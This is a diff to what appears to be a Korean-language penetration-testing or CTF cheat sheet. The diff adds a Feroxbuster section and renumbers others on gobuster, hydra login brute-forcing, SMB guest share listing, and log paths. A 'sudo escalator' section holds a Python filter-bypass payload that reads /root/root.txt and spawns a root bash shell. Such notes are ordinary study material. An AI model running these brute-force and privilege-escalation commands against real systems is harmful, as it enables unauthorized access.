@@ -26,17 +26,28 @@ gobuster dir -u [https://example.com] -w ~/wordlists/shortlist.txt
 gobuster dir -u [https://example.com] -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,php3,html,txt
 ```
 
-# 3. hydra
+# 3. Feroxbuster
+```
+feroxbuster -u [https://example.com] -w 
+  -o : 출력할 위치
+  -c : 원하지 않는 HTTP 코드 필터링 (ex. -c 301,302,403)
+  -b : cookie
+  --insecure : 인증서가 없는 웹사이트도 탐색
+
+
+```
+
+# 4. hydra
 ```
 # hydra (web_ip) http-get-form "(web_url):username=^USER^&password=^PASS^&(나머지 파라미터):(로그인 실패시 뜨는 메세지)" -L (userid dic.txt) -P (pass dic.txt) -V -f
 # hydra -L [username.txt] -P [password.txt] -v -f
 // -v : 결과 출력, -f : 결과 나오는 즉시 종료
 ```
 
-# 4. OWASP zap
+# 5. OWASP zap
 Automated Scan ㄱㄱ
 
-# 5. smb
+# 6. smb
 ```
 # smb 공유목록 나열
 smbclient -L //[타켓 IP]/ -N
@@ -45,7 +56,7 @@ smbclient -L //[타켓 IP]/ -N
 smbclient //[타겟 IP]/[sharename] -U guest          # Password for [WORKGROUP\guest]: 엔터
 ```
 
-# 6. sudo escalator
+# 7. sudo escalator
 ```
 # .py 파일에서 filtering bypass
 __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')
@@ -55,7 +66,7 @@ sudo /usr/bin/python3 /home/kali/[파일명].py
 __builtins__.__dict__['__IMPORT__'.lower()]('PTY'.lower()).__dict__['SPAWN'.lower()]('/bin/bash')
 ```
 
-# 7. Linux Log File path
+# 8. Linux Log File path
 ```
 1. /var/log/messages: 부팅시의 메시지를 포함해 전체 시스템의 로그 저장
 
